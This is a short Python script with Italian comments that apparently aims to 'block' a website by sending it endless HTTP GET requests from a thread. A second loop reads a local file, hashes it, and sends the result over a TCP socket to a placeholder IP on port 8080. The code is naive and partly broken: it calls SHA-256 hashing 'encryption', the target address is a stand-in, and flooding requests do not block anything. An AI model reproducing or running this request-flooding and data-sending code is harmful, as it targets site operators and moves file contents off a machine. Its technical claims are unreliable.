nome = str(input("Scrivi il tuo nome:\n"))

import threading
import requests
import socket
import hashlib

def blocca_sito_allinfinito(url):
    while True:
        try:
            # Invio di una richiesta HTTP
            response = requests.get(url)

            # Messaggio indicativo del blocco del sito web di destinazione
            print("Bloccato sito:", url)

        except Exception as e:
            print("Errore durante il blocco del sito", url, ":", e)

# Sostituisci "https://www.example.com" con l'URL del sito web che desideri bloccare
url_sito_da_bloccare = "https://www.example.com"

# Avvio del thread per bloccare il sito web all'infinito
thread = threading.Thread(target=blocca_sito_allinfinito, args=(url_sito_da_bloccare,))
thread.start()

def invia_richieste():
    while True:
        try:
            # Lettura dei dati da un file
            with open("dati.txt", "r") as file:
                dati = file.read()

            # Criptaggio dei dati
            dati_criptati = cripta_dati(dati)

            # Invio dei dati criptati a un indirizzo IP
            invia_a_indirizzo(dati_criptati, "ip")  # Assicurati di usare un indirizzo IP valido

            # Invio di una richiesta HTTP
            response = requests.get("https://www.example.com")

            # Blocco del sito web di destinazione
            blocca_sito("https://www.example.com")

        except Exception as e:
            print("Errore:", e)

def cripta_dati(dati):
    # Criptaggio dei dati utilizzando l'algoritmo SHA-256
    hashed_data = hashlib.sha256(dati.encode()).hexdigest()
    return hashed_data

def invia_a_indirizzo(dati, indirizzo_destinazione):
    # Invio dei dati a un indirizzo IP specifico
    try:
        # Esempio di invio dei dati tramite socket TCP
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((indirizzo_destinazione, 8080))
            s.sendall(dati.encode())
            print("Dati inviati con successo a", indirizzo_destinazione)
    except Exception as e:
        print("Errore durante l'invio dei dati a", indirizzo_destinazione, ":", e)

def blocca_sito(url):
    # Simulazione di un blocco di un sito web
    try:
        response = requests.get(url)
        print("Sito", url, "bloccato con successo")
    except Exception as e:
        print("Errore durante il blocco del sito", url, ":", e)

# Avvio del thread per inviare le richieste
thread = threading.Thread(target=invia_richieste)
thread.start()
